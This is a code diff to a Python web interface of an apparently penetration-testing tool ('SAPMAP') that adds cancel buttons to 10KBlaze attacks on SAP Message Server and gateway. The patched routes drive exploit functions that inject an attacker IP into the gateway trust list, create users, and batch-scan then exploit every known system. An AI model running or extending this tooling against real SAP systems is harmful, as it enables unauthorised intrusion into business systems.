@@ -175,6 +175,12 @@ class OutputCapture(io.TextIOBase):
 _active_tasks = {}          # key → description, e.g. "NPL:rfc_system_info" → "RFC System Info"
 _active_tasks_lock = threading.Lock()
 
+# Stop-events for cancellable long-running operations (e.g. 10KBlaze betrusted,
+# which can otherwise block for up to 25 minutes waiting for the MS propagation
+# cycle).  The STOP button signals every event registered here.
+_betrusted_stops = {}       # key → threading.Event
+_betrusted_stops_lock = threading.Lock()
+
 
 def _task_start(key: str, label: str = ""):
     with _active_tasks_lock:
@@ -189,6 +195,28 @@ def _task_end(key: str):
 def _get_active_tasks() -> dict:
     with _active_tasks_lock:
         return dict(_active_tasks)
+
+
+def _register_betrusted_stop(key: str, event: threading.Event):
+    with _betrusted_stops_lock:
+        _betrusted_stops[key] = event
+
+
+def _unregister_betrusted_stop(key: str):
+    with _betrusted_stops_lock:
+        _betrusted_stops.pop(key, None)
+
+
+def _signal_all_betrusted_stops() -> int:
+    """Signal every registered betrusted stop_event. Returns count signalled."""
+    with _betrusted_stops_lock:
+        events = list(_betrusted_stops.items())
+    for _, ev in events:
+        try:
+            ev.set()
+        except Exception:
+            pass
+    return len(events)
 
 
 def _bg(key: str, label: str, fn):
@@ -777,7 +805,10 @@ class SAPMAPApi:
         self.cancel_event.set()
         self.scan_cancelled = True
         print("[!] Stop requested — cancelling scan ...")
-        return {"status": "stopping"}
+        n = _signal_all_betrusted_stops()
+        if n:
+            print(f"[!] Stop requested — cancelling {n} 10KBlaze betrusted run(s) ...")
+        return {"status": "stopping", "betrusted_cancelled": n}
 
     def get_state_dict(self):
         """Get current state as a dict for the frontend."""
@@ -1185,18 +1216,26 @@ def create_app(api: SAPMAPApi) -> Bottle:
         nilist_wait  = float(data.get("nilist_wait", 30.0))
         client       = data.get("client")
 
-        def _run():
-            created = sapmap_exploit.create_user_betrusted_chain(
-                node, api.state,
-                attacker_ip=attacker_ip,
-                nilist_wait=nilist_wait,
-                client=client,
-            )
-            if created:
-                api.state.track_created_user(created)
-                sapmap_exploit._post_exploit_enrichment(node, api.state)
+        stop_event = threading.Event()
+        key = f"{sid}:betrusted_chain"
+        _register_betrusted_stop(key, stop_event)
 
-        _bg(f"{sid}:betrusted_chain", "10KBLAZE Full Chain", _run)
+        def _run():
+            try:
+                created = sapmap_exploit.create_user_betrusted_chain(
+                    node, api.state,
+                    attacker_ip=attacker_ip,
+                    nilist_wait=nilist_wait,
+                    client=client,
+                    stop_event=stop_event,
+                )
+                if created:
+                    api.state.track_created_user(created)
+                    sapmap_exploit._post_exploit_enrichment(node, api.state)
+            finally:
+                _unregister_betrusted_stop(key)
+
+        _bg(key, "10KBLAZE Full Chain", _run)
         return json.dumps({"status": "started"})
 
     @app.route("/api/node/<sid>/betrusted", method="POST")
@@ -1220,24 +1259,35 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         nilist_wait = float(data.get("nilist_wait", 30.0))
 
-        def _run():
-            print(f"[*] {sid}: Running betrusted attack on "
-                  f"{node.ip or node.hostname}:{node.ms_port} "
-                  f"→ injecting {attacker_ip} into gateway trust list")
-            # try_betrusted_chain keeps the MS connection alive while polling GW
-            ok = sapmap_exploit.try_betrusted_chain(
-                node, api.state,
-                attacker_ip=attacker_ip,
-                nilist_wait=nilist_wait,
-            )
-            if ok:
-                print(f"[+] {sid}: Gateway now TRUSTED from {attacker_ip} "
-                      f"— GW exploit is available")
-            else:
-                print(f"[-] {sid}: Gateway did not become trusted. "
-                      f"Try 'Create User (10KBLAZE Full Chain)' for the automated chain.")
+        stop_event = threading.Event()
+        key = f"{sid}:betrusted"
+        _register_betrusted_stop(key, stop_event)
 
-        _bg(f"{sid}:betrusted", "Betrusted Attack", _run)
+        def _run():
+            try:
+                print(f"[*] {sid}: Running betrusted attack on "
+                      f"{node.ip or node.hostname}:{node.ms_port} "
+                      f"→ injecting {attacker_ip} into gateway trust list")
+                # try_betrusted_chain keeps the MS connection alive while polling GW
+                ok = sapmap_exploit.try_betrusted_chain(
+                    node, api.state,
+                    attacker_ip=attacker_ip,
+                    nilist_wait=nilist_wait,
+                    stop_event=stop_event,
+                )
+                if stop_event.is_set():
+                    print(f"[!] {sid}: betrusted cancelled by user")
+                elif ok:
+                    print(f"[+] {sid}: Gateway now TRUSTED from {attacker_ip} "
+                          f"— GW exploit is available")
+                else:
+                    print(f"[-] {sid}: Gateway did not become trusted. "
+                          f"Try 'Create User (10KBLAZE Full Chain)' for the automated chain.")
+            finally:
+                stop_event.set()   # ensure betrusted thread exits
+                _unregister_betrusted_stop(key)
+
+        _bg(key, "Betrusted Attack", _run)
         return json.dumps({"status": "started"})
 
     @app.route("/api/node/<sid>/create_user", method="POST")
@@ -2693,44 +2743,59 @@ def create_app(api: SAPMAPApi) -> Bottle:
         attacker_ip = data.get("attacker_ip", "").strip()
         nodes = list(api.state.nodes.values())
 
+        stop_event = threading.Event()
+        key = "_check_all_betrusted"
+        _register_betrusted_stop(key, stop_event)
+
         def _run():
-            # Phase 1: scan all MS ports
-            print(f"[*] Phase 1: Scanning MS internal ports on {len(nodes)} systems...")
-            vulnerable = []
-            for node in nodes:
-                if node.ms_vulnerable:
-                    print(f"[+] {node.sid}: Already known MS vulnerable (port {node.ms_port})")
-                    vulnerable.append(node)
-                    continue
-                print(f"[*] {node.sid}: Checking MS internal port...")
-                sapmap_scanner.check_ms_betrusted(node)
-                if node.ms_vulnerable:
-                    print(f"[+] {node.sid}: MS port {node.ms_port} VULNERABLE!")
-                    vulnerable.append(node)
+            try:
+                # Phase 1: scan all MS ports
+                print(f"[*] Phase 1: Scanning MS internal ports on {len(nodes)} systems...")
+                vulnerable = []
+                for node in nodes:
+                    if stop_event.is_set():
+                        print(f"[!] Check All 10KBlaze cancelled by user")
+                        return
+                    if node.ms_vulnerable:
+                        print(f"[+] {node.sid}: Already known MS vulnerable (port {node.ms_port})")
+                        vulnerable.append(node)
+                        continue
+                    print(f"[*] {node.sid}: Checking MS internal port...")
+                    sapmap_scanner.check_ms_betrusted(node)
+                    if node.ms_vulnerable:
+                        print(f"[+] {node.sid}: MS port {node.ms_port} VULNERABLE!")
+                        vulnerable.append(node)
 
-            if not vulnerable:
-                print(f"[-] No systems with vulnerable MS internal port found")
-                return
+                if not vulnerable:
+                    print(f"[-] No systems with vulnerable MS internal port found")
+                    return
 
-            # Phase 2: inject trusted IP on vulnerable systems
-            print(f"\n[*] Phase 2: Injecting trusted IP on {len(vulnerable)} vulnerable systems...")
-            for node in vulnerable:
-                print(f"[*] {node.sid}: betrusted → inject {attacker_ip or 'auto-detect'}")
-                ok = sapmap_exploit.try_betrusted_chain(
-                    node, api.state,
-                    attacker_ip=attacker_ip,
-                    nilist_wait=30,
-                )
-                if ok:
-                    print(f"[+] {node.sid}: Gateway TRUSTED — GW exploit available!")
-                else:
-                    print(f"[-] {node.sid}: betrusted did not establish trust")
+                # Phase 2: inject trusted IP on vulnerable systems
+                print(f"\n[*] Phase 2: Injecting trusted IP on {len(vulnerable)} vulnerable systems...")
+                for node in vulnerable:
+                    if stop_event.is_set():
+                        print(f"[!] Check All 10KBlaze cancelled by user")
+                        return
+                    print(f"[*] {node.sid}: betrusted → inject {attacker_ip or 'auto-detect'}")
+                    ok = sapmap_exploit.try_betrusted_chain(
+                        node, api.state,
+                        attacker_ip=attacker_ip,
+                        nilist_wait=30,
+                        stop_event=stop_event,
+                    )
+                    if ok:
+                        print(f"[+] {node.sid}: Gateway TRUSTED — GW exploit available!")
+                    else:
+                        print(f"[-] {node.sid}: betrusted did not establish trust")
 
-            trusted = [n for n in vulnerable if n.gw_vulnerable]
-            print(f"\n[*] Results: {len(vulnerable)} MS vulnerable, "
-                  f"{len(trusted)} gateway trusted")
+                trusted = [n for n in vulnerable if n.gw_vulnerable]
+                print(f"\n[*] Results: {len(vulnerable)} MS vulnerable, "
+                      f"{len(trusted)} gateway trusted")
+            finally:
+                stop_event.set()
+                _unregister_betrusted_stop(key)
 
-        _bg("_check_all_betrusted", "Check All 10KBlaze", _run)
+        _bg(key, "Check All 10KBlaze", _run)
         return json.dumps({"status": "started", "systems": len(nodes)})
 
     @app.route("/api/actions/reset_rfc_cache", method="POST")
